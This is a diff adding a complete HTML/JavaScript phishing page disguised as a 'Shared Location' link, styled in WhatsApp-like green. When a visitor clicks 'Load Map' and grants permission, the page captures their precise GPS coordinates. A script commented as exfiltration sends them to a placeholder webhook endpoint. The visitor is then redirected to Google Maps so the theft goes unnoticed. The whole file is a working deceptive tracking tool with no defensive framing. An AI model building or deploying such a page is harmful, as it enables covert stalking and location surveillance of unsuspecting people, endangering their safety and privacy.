@@ -1,0 +1,50 @@
+<!-- language: HTML/JS, file: index.html, target: Mobile/Desktop Browser -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Shared Location</title>
+    <style>
+        body { background: #121212; color: #e0e0e0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; border: 1px solid #333; padding: 2rem; border-radius: 8px; background: #1e1e1e; }
+        button { background: #25d366; color: #fff; border: none; padding: 10px 20px; font-size: 1rem; border-radius: 4px; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Loading Live Location...</h2>
+        <p>Please allow location access to view coordinates.</p>
+        <button id="btn" onclick="getLocation()">Load Map</button>
+    </div>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Geolocation not supported.");
+            }
+        }
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            
+            // Exfiltrate to webhook receiver
+            fetch('https://your-webhook-endpoint.com/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
+            }).then(() => {
+                window.location.href = "https://maps.google.com";
+            });
+        }
+        function showError(error) {
+            alert("Location access required to view shared point.");
+        }
+    </script>
+</body>
+</html>
